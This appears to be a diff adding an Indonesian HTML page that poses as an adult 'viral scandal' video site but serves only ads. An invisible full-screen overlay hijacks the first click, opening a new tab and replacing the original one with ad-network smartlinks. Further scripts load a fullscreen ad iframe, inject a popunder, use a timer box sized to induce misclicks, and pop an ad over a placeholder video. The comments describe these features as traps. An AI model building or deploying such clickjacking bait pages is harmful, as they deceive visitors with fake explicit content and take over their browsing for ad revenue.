@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X-Tube Viral | HD Video Skandal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #0f0f0f; /* Warna latar belakang khas Tube */
+            color: white;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        
+        .text-hub { color: #f97316; }
+        .bg-hub { background-color: #f97316; }
+
+        /* FAKE HEADER */
+        .fake-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background-color: #0f0f0f;
+            border-bottom: 1px solid #272727;
+        }
+
+        .search-bar {
+            background: #121212;
+            border: 1px solid #303030;
+            border-radius: 20px;
+            padding: 8px 20px;
+            color: #aaa;
+            display: flex;
+            align-items: center;
+            flex-grow: 1;
+            max-width: 400px;
+            margin: 0 15px;
+        }
+
+        /* FAKE PLAYER - Tampilan Realistis */
+        .fake-player-container {
+            position: relative;
+            width: 100%;
+            max-width: 800px;
+            aspect-ratio: 16/9;
+            background: #000; /* Dasar hitam */
+            margin: 0 auto;
+            cursor: pointer;
+            overflow: hidden; /* Mencegah blur meluber */
+        }
+        
+        /* Gambar Thumbnail yang di-blur */
+        .thumbnail-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://images.unsplash.com/photo-1518131333333-e918c502df21?q=80&w=1000&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            filter: blur(8px) brightness(0.6); /* Blur dan gelapkan */
+            transform: scale(1.05); /* Sedikit diperbesar agar tepian blur tidak terlihat putih */
+            z-index: 1;
+        }
+
+        .play-overlay {
+            position: absolute;
+            inset: 0;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .play-btn-icon {
+            font-size: 4.5rem;
+            color: rgba(255, 255, 255, 0.9);
+            filter: drop-shadow(0px 4px 10px rgba(0,0,0,0.8));
+            transition: transform 0.2s;
+        }
+        
+        .play-overlay:hover .play-btn-icon {
+            transform: scale(1.1);
+        }
+
+        /* Elemen Bawah Player (Fake) */
+        .player-bottom-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 15px;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+            z-index: 3;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+        
+        .progress-bar-fake {
+            position: absolute;
+            bottom: 40px;
+            left: 15px;
+            right: 15px;
+            height: 3px;
+            background: rgba(255,255,255,0.3);
+        }
+        .progress-bar-fake-fill {
+            width: 0%;
+            height: 100%;
+            background: #f00;
+        }
+
+        /* INVISIBLE OVERLAY (JEBAKAN KLIK PERTAMA) */
+        #invisible-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+        }
+
+        .ad-container {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0;
+            width: 100%;
+            overflow: hidden;
+            min-height: 50px; /* Mencegah layout loncat */
+        }
+
+        /* REAL VIDEO PLAYER (Halaman Nonton) */
+        .real-video-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            background: #000;
+            border-radius: 8px; /* Lebih halus */
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        video {
+            width: 100%;
+            height: auto;
+            display: block; /* Mencegah jarak aneh di bawah video */
+            outline: none;
+        }
+
+        /* NATIVE AD BLOCKER (DI TENGAH VIDEO) */
+        .mid-video-ad {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 50;
+            background: rgba(0, 0, 0, 0.85); /* Sedikit lebih gelap */
+            padding: 8px;
+            border-radius: 8px; /* Rounded corners */
+            text-align: center;
+            width: 90%;
+            max-width: 300px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.9);
+            display: none;
+            backdrop-filter: blur(4px); /* Efek modern */
+        }
+
+        .tiny-close-btn {
+            position: absolute;
+            top: -12px;
+            right: -12px;
+            background: #333;
+            color: #fff;
+            border: 2px solid #000;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            font-size: 14px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 60;
+            transition: background 0.2s;
+        }
+        .tiny-close-btn:hover { background: #555; }
+        
+        /* Tombol Aksi (Like, Share, dll) */
+        .action-button {
+            display: flex;
+            align-items: center;
+            background: #272727;
+            padding: 6px 12px;
+            border-radius: 18px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+        .action-button i { margin-right: 6px; font-size: 1rem; }
+    </style>
+</head>
+<body>
+
+    <!-- ========================================== -->
+    <!-- ALUR 1: FAKE TUBE SITE (TAMPILAN AWAL)     -->
+    <!-- ========================================== -->
+    <div id="view-home" class="hidden min-h-screen flex-col">
+        <!-- LAYAR JEBAKAN SELURUH BODY -->
+        <div id="invisible-overlay"></div>
+
+        <div class="fake-header">
+            <div class="text-xl font-bold flex items-center">
+                <i class="fa-solid fa-bars text-xl mr-4 text-white"></i>
+                <span>X-TUBE <span class="bg-hub text-black px-1.5 py-0.5 rounded ml-1 text-sm">VIRAL</span></span>
+            </div>
+            <div class="hidden sm:flex search-bar">
+                <input type="text" placeholder="Search" class="bg-transparent outline-none w-full text-white text-sm">
+                <i class="fa-solid fa-magnifying-glass text-gray-400"></i>
+            </div>
+            <div class="flex items-center text-xl gap-4 text-white">
+                <i class="fa-solid fa-video"></i>
+                <i class="fa-regular fa-bell"></i>
+                <i class="fa-solid fa-circle-user"></i>
+            </div>
+        </div>
+
+        <div class="ad-container mt-2">
+            <script async="async" data-cfasync="false" src="https://pl30286956.effectivecpmnetwork.com/449c689d4a0baa4a8c41d608f599dad5/invoke.js"></script>
+            <div id="container-449c689d4a0baa4a8c41d608f599dad5"></div>
+        </div>
+
+        <!-- FAKE PLAYER YANG LEBIH REALISTIS -->
+        <div class="fake-player-container mt-2">
+            <!-- Background Blur -->
+            <div class="thumbnail-image"></div>
+            
+            <div class="play-overlay">
+                <i class="fa-solid fa-circle-play play-btn-icon"></i>
+                <p class="mt-3 text-sm font-medium bg-black/60 px-3 py-1 rounded-full text-white tracking-wide">Peringatan: Video Dewasa 18+</p>
+            </div>
+            
+            <!-- Elemen UI Video Palsu -->
+            <div class="progress-bar-fake"><div class="progress-bar-fake-fill"></div></div>
+            <div class="player-bottom-bar">
+                <div class="flex items-center gap-4 text-white text-lg">
+                    <i class="fa-solid fa-play"></i>
+                    <i class="fa-solid fa-volume-high"></i>
+                    <span class="text-xs font-medium">0:00 / 14:28</span>
+                </div>
+                <div class="flex items-center gap-4 text-white text-lg">
+                    <i class="fa-solid fa-closed-captioning"></i>
+                    <i class="fa-solid fa-gear"></i>
+                    <i class="fa-solid fa-expand"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- INFO VIDEO DETAIL -->
+        <div class="p-4 max-w-[800px] mx-auto w-full">
+            <h1 class="text-lg sm:text-xl font-semibold mb-2 line-clamp-2">FULL DURASI - Skandal Viral Selebgram Hotel Mewah 2026 (No Sensor)</h1>
+            
+            <!-- Statistik Info -->
+            <div class="flex flex-wrap items-center text-sm text-gray-400 mb-4 gap-y-2">
+                <span class="mr-3 font-medium text-gray-300">2.4M x ditonton</span>
+                <span class="mr-3">•</span>
+                <span class="mr-3">Baru saja diunggah</span>
+                <span class="mr-3 text-red-500 font-bold border border-red-500 px-1 text-xs rounded">HD</span>
+            </div>
+
+            <!-- Tombol Aksi (Like, Share, Download) -->
+            <div class="flex overflow-x-auto pb-2 mb-4 no-scrollbar">
+                <div class="action-button">
+                    <i class="fa-regular fa-thumbs-up"></i> 124K
+                    <div class="w-px h-4 bg-gray-500 mx-3"></div>
+                    <i class="fa-regular fa-thumbs-down"></i>
+                </div>
+                <div class="action-button">
+                    <i class="fa-solid fa-share"></i> Bagikan
+                </div>
+                <div class="action-button">
+                    <i class="fa-solid fa-download"></i> Download
+                </div>
+                <div class="action-button">
+                    <i class="fa-regular fa-bookmark"></i> Simpan
+                </div>
+                <div class="action-button bg-transparent rounded-full px-2">
+                    <i class="fa-solid fa-ellipsis"></i>
+                </div>
+            </div>
+            
+            <div class="border-t border-[#272727] pt-4 mt-2">
+                 <div class="flex items-center mb-3">
+                    <div class="w-10 h-10 rounded-full bg-gray-600 mr-3 flex items-center justify-center text-sm font-bold">VS</div>
+                    <div>
+                        <div class="font-bold text-sm">ViralSkandal Indo <i class="fa-solid fa-circle-check text-gray-400 text-xs ml-1"></i></div>
+                        <div class="text-xs text-gray-400">890K Subscriber</div>
+                    </div>
+                    <button class="ml-auto bg-white text-black font-bold px-4 py-1.5 rounded-full text-sm">Subscribe</button>
+                 </div>
+            </div>
+
+            <div class="ad-container">
+                <script>
+                    atOptions = {
+                        'key' : '18c2022fcb1e192382b803ffb3c9703a',
+                        'format' : 'iframe',
+                        'height' : 250,
+                        'width' : 300,
+                        'params' : {}
+                    };
+                </script>
+                <script src="https://www.highperformanceformat.com/18c2022fcb1e192382b803ffb3c9703a/invoke.js"></script>
+            </div>
+        </div>
+
+        <!-- SOCIAL BAR -->
+        <script src="https://pl30287308.effectivecpmnetwork.com/24/8b/7f/248b7fb71af7bc94a1f7aa8746a9f4a2.js"></script>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- ALUR 2: HALAMAN TIMER (DI TAB BARU)        -->
+    <!-- PERPADUAN SMARTLINK FULLSCREEN & POPUNDER  -->
+    <!-- ========================================== -->
+    <div id="view-timer" class="hidden min-h-screen relative flex-col items-center justify-center p-4">
+        
+        <!-- SMARTLINK ADSTERRA TAMPIL FULLSCREEN DI BACKGROUND -->
+        <iframe id="fullscreen-smartlink-iframe" src="" class="absolute inset-0 w-full h-full border-none z-0"></iframe>
+
+        <!-- POPUNDER ADSTERRA DITANAM DI SINI -->
+        <div id="popunder-container"></div>
+
+        <!-- KOTAK TIMER (LEBIH KECIL & ELEGAN) -->
+        <!-- Ukuran diperkecil, tapi tombol tetap jelas agar potensi salah klik di luar kotak meningkat -->
+        <div class="relative z-10 bg-black/80 backdrop-blur-md border border-gray-700 p-5 rounded-xl shadow-2xl text-center w-full max-w-[280px]">
+            <p class="text-gray-300 mb-1 text-sm font-medium">Sponsor Iklan</p>
+            <p class="text-xs text-gray-500 mb-3">Harap tunggu sebentar...</p>
+            
+            <div class="text-5xl font-black text-white mb-4 drop-shadow-md" id="countdown-text">...</div>
+            
+            <button id="skip-ad-btn" class="hidden w-full py-2.5 bg-white text-black font-bold text-sm rounded shadow-lg hover:bg-gray-200 transition-colors uppercase tracking-wider">
+                Lanjut ke Video <i class="fa-solid fa-angle-right ml-1"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- ALUR 3: HALAMAN NONTON ASLI + JEBAKAN      -->
+    <!-- ========================================== -->
+    <div id="view-watch" class="hidden min-h-screen flex-col bg-[#050505] p-2 sm:p-4">
+        
+        <div class="flex items-center mb-3">
+             <i class="fa-solid fa-arrow-left text-white mr-3 text-lg cursor-pointer" onclick="window.history.back()"></i>
+             <div class="font-bold text-white text-sm">Menonton Video</div>
+        </div>
+
+        <div class="real-video-wrapper">
+            <!-- 
+            [!!! ARAHAN UNTUKMU: TARUH LINK VIDEO MP4 CERAMAH KAMU DI SINI !!!] 
+            Ganti 'https://www.w3schools.com/html/mov_bbb.mp4' dengan URL direct link MP4 videomu.
+            -->
+            <video id="real-video" controls autoplay controlsList="nodownload">
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Browser Anda tidak mendukung tag video.
+            </video>
+
+            <!-- JEBAKAN NATIVE AD DI TENGAH VIDEO (Desain Lebih Rapi) -->
+            <div id="mid-roll-ad" class="mid-video-ad">
+                <div class="tiny-close-btn" onclick="document.getElementById('mid-roll-ad').style.display = 'none';">✕</div>
+                <div class="flex justify-between items-center mb-1">
+                    <span class="text-[10px] text-gray-400 font-medium">Iklan Bersponsor</span>
+                    <span class="text-[9px] bg-gray-700 px-1 rounded text-white">Ad</span>
+                </div>
+                
+                <div class="bg-white rounded overflow-hidden">
+                    <script async="async" data-cfasync="false" src="https://pl30286956.effectivecpmnetwork.com/449c689d4a0baa4a8c41d608f599dad5/invoke.js"></script>
+                    <div id="container-449c689d4a0baa4a8c41d608f599dad5"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="ad-container mt-4">
+                <script>
+                    atOptions = {
+                        'key' : '18c2022fcb1e192382b803ffb3c9703a',
+                        'format' : 'iframe',
+                        'height' : 250,
+                        'width' : 300,
+                        'params' : {}
+                    };
+                </script>
+                <script src="https://www.highperformanceformat.com/18c2022fcb1e192382b803ffb3c9703a/invoke.js"></script>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const baseUrl = window.location.href.split('?')[0]; 
+            const urlParams = new URLSearchParams(window.location.search);
+            const step = urlParams.get('step');
+
+            // --- KOLEKSI SMARTLINK (Tujuan Akhir) ---
+            const adDestinationLinks = [
+                "https://www.effectivecpmnetwork.com/mu41bpx4ir?key=7a14c3f46cc3ff40dd518337e2ee33c7",
+                "https://www.effectivecpmnetwork.com/jge90s26?key=4bd6974a6029fb8c1b765f739a0ff819",
+                "https://www.effectivecpmnetwork.com/ysdqn6q68?key=1e0d32c323d5eff821d032b049b22598",
+                "https://www.effectivecpmnetwork.com/ijywmti3wn?key=50a0514a11625c5fa5fcbe314a4016fb",
+                "https://www.effectivecpmnetwork.com/eircxi29?key=e4736b2e776f28ec8ba13c9b9c9cbdb3",
+                "https://www.effectivecpmnetwork.com/pe9ycnav?key=eec9fd22650fd65c6d3fe51ebe353e94"
+            ];
+
+            // ==========================================
+            // ALUR 1: FAKE TUBE (PENGUNJUNG DATANG)
+            // ==========================================
+            if (!step) {
+                document.getElementById('view-home').classList.remove('hidden');
+                document.getElementById('view-home').classList.add('flex');
+
+                const overlay = document.getElementById('invisible-overlay');
+                
+                overlay.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const randomLinkForTabLama = adDestinationLinks[Math.floor(Math.random() * adDestinationLinks.length)];
+                    
+                    // 1. Tab Baru Terbuka ke Halaman Timer
+                    window.open(baseUrl + "?step=timer", '_blank');
+
+                    // 2. Tab Lama BERUBAH TOTAL MENJADI ISI IKLAN
+                    window.location.replace(randomLinkForTabLama);
+                });
+            }
+
+            // ==========================================
+            // ALUR 2: TAB BARU (SMARTLINK FULLSCREEN + TIMER KECIL + POPUNDER)
+            // ==========================================
+            else if (step === 'timer') {
+                document.getElementById('view-timer').classList.remove('hidden');
+                document.getElementById('view-timer').classList.add('flex');
+
+                // Load Iframe Smartlink
+                const randomLinkForIframe = adDestinationLinks[Math.floor(Math.random() * adDestinationLinks.length)];
+                document.getElementById('fullscreen-smartlink-iframe').src = randomLinkForIframe;
+
+                // Suntik Popunder
+                const popunderScript = document.createElement('script');
+                popunderScript.src = "https://pl30287346.effectivecpmnetwork.com/b3/fc/9b/b3fc9bdf595443d04153e48bbb4b2c51.js";
+                document.getElementById('popunder-container').appendChild(popunderScript);
+
+                const countdownText = document.getElementById('countdown-text');
+                const skipBtn = document.getElementById('skip-ad-btn');
+                let timeLeft = 5;
+
+                // Jeda 2 detik sebelum hitung mundur dimulai
+                setTimeout(() => {
+                    countdownText.textContent = timeLeft;
+                    const timerId = setInterval(function() {
+                        timeLeft--;
+                        countdownText.textContent = timeLeft;
+
+                        if (timeLeft <= 0) {
+                            clearInterval(timerId);
+                            countdownText.style.display = 'none';
+                            skipBtn.classList.remove('hidden');
+                        }
+                    }, 1000);
+                }, 2000); // Jeda 2 detik (2000ms)
+
+                // Saat klik tombol LEWATI
+                skipBtn.addEventListener('click', function() {
+                    window.location.href = baseUrl + "?step=watch";
+                });
+            }
+
+            // ==========================================
+            // ALUR 3: NONTON VIDEO + JEBAKAN IKLAN TENGAH
+            // ==========================================
+            else if (step === 'watch') {
+                document.getElementById('view-watch').classList.remove('hidden');
+                document.getElementById('view-watch').classList.add('flex');
+                
+                const videoEl = document.getElementById('real-video');
+                const midRollAd = document.getElementById('mid-roll-ad');
+
+                videoEl.play().catch(function(e) {
+                    console.log("Autoplay ditolak browser");
+                });
+
+                // Munculkan Native Ad tepat di tengah video setelah 4 detik menonton
+                setTimeout(function() {
+                    midRollAd.style.display = 'block';
+                }, 4000);
+            }
+        });
+    </script>
+</body>
+</html>
